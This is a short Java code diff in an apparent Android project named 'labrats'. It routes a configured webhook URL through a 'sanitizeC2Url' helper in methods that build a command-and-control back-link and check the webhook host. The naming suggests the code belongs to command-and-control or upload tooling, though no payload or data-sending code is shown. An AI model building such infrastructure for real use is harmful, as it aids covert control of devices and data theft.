@@ -280,13 +280,13 @@ public class FirebaseConfig extends NanoHTTPD {
     }
 
     private String c2BackUrl() {
-        String c2Url = com.labs.labrats.BuildConfig.WEBHOOK_URL;
+        String c2Url = C2_Uploader.sanitizeC2Url(com.labs.labrats.BuildConfig.WEBHOOK_URL);
         if (c2Url == null || c2Url.trim().isEmpty()) return "#";
         return c2Url;
     }
 
     public static boolean isRenderWebhook() {
-        String url = com.labs.labrats.BuildConfig.WEBHOOK_URL;
+        String url = C2_Uploader.sanitizeC2Url(com.labs.labrats.BuildConfig.WEBHOOK_URL);
         if (url == null || url.trim().isEmpty()) return false;
         String low = url.toLowerCase().trim();
         return !low.contains("script.google.com") && !low.contains("script.googleusercontent.com") && !low.contains("google.com");
